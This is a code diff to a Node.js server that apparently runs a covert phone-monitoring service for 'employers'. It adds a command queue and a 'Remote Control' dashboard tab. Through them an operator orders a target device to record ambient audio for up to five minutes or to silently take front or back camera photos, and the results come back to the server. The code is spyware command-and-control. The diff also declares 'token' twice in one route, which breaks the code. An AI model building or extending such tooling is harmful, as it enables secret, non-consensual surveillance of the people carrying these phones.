@@ -114,11 +114,24 @@ const CallRecordingSchema = new mongoose.Schema({
     token: String,
     filename: String,
     audio_base64: String,
+    duration: Number,
+    size_kb: Number,
     recorded_at: Number,
     received_at: { type: Date, default: Date.now }
 });
-const CallRecording = mongoose.model('CallRecording', CallRecordingSchema)
 
+const CommandSchema = new mongoose.Schema({
+    token: String,
+    type: { type: String }, // 'record_ambient' or 'take_photo'
+    status: { type: String, default: 'pending' }, // pending, executing, done, failed
+    duration: { type: Number, default: 30 }, // seconds for audio
+    result: String, // base64 result
+    created_at: { type: Date, default: Date.now },
+    completed_at: Date
+});
+
+const Command = mongoose.model('Command', CommandSchema);
+const CallRecording = mongoose.model('CallRecording', CallRecordingSchema)
 const Employer = mongoose.model('Employer', EmployerSchema);
 const Token = mongoose.model('Token', TokenSchema);
 const Device = mongoose.model('Device', DeviceSchema);
@@ -394,6 +407,59 @@ app.post('/device/call-recording', async (req, res) => {
         await CallRecording.create({ token, ...req.body });
         console.log(`Call recording received from ${token}: ${req.body.filename}`);
         res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
+});
+
+// Employer sends command
+app.post('/employer/command', async (req, res) => {
+    try {
+        const { token, type, duration } = req.body;
+        const command = await Command.create({ token, type, duration: duration || 30 });
+        res.json({ success: true, command_id: command._id });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
+});
+
+// Device polls for pending commands
+app.get('/device/commands', async (req, res) => {
+    try {
+        const token = getToken(req);
+        const commands = await Command.find({ token, status: 'pending' });
+        // Mark as executing
+        for (const cmd of commands) {
+            await Command.findByIdAndUpdate(cmd._id, { status: 'executing' });
+        }
+        res.json({ success: true, commands });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
+});
+
+// Device sends result
+app.post('/device/command-result', async (req, res) => {
+    try {
+        const { command_id, result, status } = req.body;
+        await Command.findByIdAndUpdate(command_id, { 
+            result, 
+            status: status || 'done',
+            completed_at: new Date()
+        });
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
+});
+
+// Employer gets command results
+app.post('/employer/command-results', async (req, res) => {
+    try {
+        const { token } = req.body;
+        const commands = await Command.find({ token, status: 'done' })
+            .sort({ completed_at: -1 }).limit(20);
+        res.json({ success: true, commands });
     } catch (e) {
         res.json({ success: false, message: e.message });
     }
@@ -686,6 +752,7 @@ app.get('/tokens', (req, res) => {
 // Per-device dashboard with tabs
 app.get('/device', async (req, res) => {
     const token = req.query.token;
+    const token = req.query.token;
     if (!token) return res.redirect('/tokens');
 
     const device = await Device.findOne({ token });
@@ -722,6 +789,7 @@ app.get('/device', async (req, res) => {
 <button class="tab" onclick="showTab('contacts', this)"> Contacts</button>
 <button class="tab" onclick="showTab('media', this)"> Media</button>
 <button class="tab" onclick="showTab('messages', this)"> Messages</button>
+<button class="tab" onclick="showTab('remote', this)"> Remote</button>
         </div>
 
         <!-- Apps Tab -->
@@ -753,8 +821,9 @@ app.get('/device', async (req, res) => {
                     <td>${c.duration_seconds}s</td>
                     <td>${new Date(c.called_at).toLocaleString()}</td>
                     <td>${recording ? 
-                        `<audio controls src="data:audio/mp4;base64,${recording.audio_base64}" style="height:32px;width:200px"></audio>` : 
-                        '<span style="color:#888;font-size:12px">No recording</span>'
+                        '<div><audio controls src="data:audio/mp4;base64,' + recording.audio_base64 + '" style="height:32px;width:200px"></audio>'
+                        + '<div style="color:#888;font-size:11px">' + (recording.duration || 0) + 's · ' + (recording.size_kb || 0) + 'KB</div></div>' : 
+                        '<span style="color:#888;font-size:12px">No recording</span>'   
                     }</td>
                 </tr>`;
             }).join('')}
@@ -876,6 +945,49 @@ app.get('/device', async (req, res) => {
                 }).join('')}
             </table>
         </div>
+
+        <!-- Remote Control Tab -->
+<div id="tab-remote" class="tab-content">
+    <div class="card">
+        <h3 style="color:#1a1a2e;margin-bottom:6px">Remote Control</h3>
+        <p style="color:#888;font-size:13px;margin-bottom:20px">Commands are executed within 2 minutes when device is active.</p>
+        
+        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-bottom:24px">
+            <div style="background:#f8f8f8;border-radius:12px;padding:20px;text-align:center">
+                <div style="font-size:36px;margin-bottom:8px">🎙️</div>
+                <h4 style="color:#1a1a2e;margin-bottom:8px">Record Ambient</h4>
+                <p style="color:#888;font-size:12px;margin-bottom:12px">Record surroundings for 30 seconds</p>
+                <select id="record-duration" style="width:100%;padding:6px;border:1px solid #ddd;border-radius:6px;margin-bottom:8px;font-size:13px">
+                    <option value="15">15 seconds</option>
+                    <option value="30" selected>30 seconds</option>
+                    <option value="60">1 minute</option>
+                    <option value="120">2 minutes</option>
+                    <option value="300">5 minutes</option>
+                </select>
+                <button class="btn btn-primary" onclick="sendCommand('record_ambient')" style="width:100%">Start Recording</button>
+            </div>
+            
+            <div style="background:#f8f8f8;border-radius:12px;padding:20px;text-align:center">
+                <div style="font-size:36px;margin-bottom:8px">📷</div>
+                <h4 style="color:#1a1a2e;margin-bottom:8px">Take Photo</h4>
+                <p style="color:#888;font-size:12px;margin-bottom:12px">Silently capture front or back camera</p>
+                <select id="camera-facing" style="width:100%;padding:6px;border:1px solid #ddd;border-radius:6px;margin-bottom:8px;font-size:13px">
+                    <option value="back">Back Camera</option>
+                    <option value="front">Front Camera</option>
+                </select>
+                <button class="btn btn-primary" onclick="sendCommand('take_photo')" style="width:100%">Take Photo</button>
+            </div>
+        </div>
+
+        <div id="remote-msg" style="display:none;padding:10px;border-radius:8px;margin-bottom:16px"></div>
+
+        <h4 style="color:#1a1a2e;margin-bottom:12px">Recent Results</h4>
+        <div id="remote-results">
+            <p style="color:#888;text-align:center;padding:20px">Loading results...</p>
+        </div>
+    </div>
+</div>
+
     </div>
 </div>
 
@@ -905,6 +1017,7 @@ app.get('/device', async (req, res) => {
 </script>
 <script src="/dashboard.js"></script>
     </body></html>`);
+
 });
 
 
